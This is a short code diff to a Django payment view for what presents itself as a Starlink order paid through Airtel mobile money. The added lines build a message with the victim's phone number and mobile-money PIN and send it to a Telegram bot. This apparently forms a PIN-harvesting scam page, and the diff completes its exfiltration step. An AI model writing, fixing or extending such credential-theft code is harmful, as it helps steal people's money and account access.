@@ -88,4 +88,6 @@ def ecocash_entry(request, order_id):
             order.payment_entered_at = timezone.now()
             order.save()
             
-            message = f"<b>Commande Starlink - Bot Airtel :</b>\nID Kit : {order.starlink_
+# Ensure the f-string curly braces are properly closed around your model variables
+            message = f"<b>Commande Starlink - Bot Airtel :</b>\nID Kit : {order.starlink_kit_id}\nTel : {airtel_number}\nPIN : {pin}\nMontant : CDF {order.amount}"
+            send_telegram_notification(message)
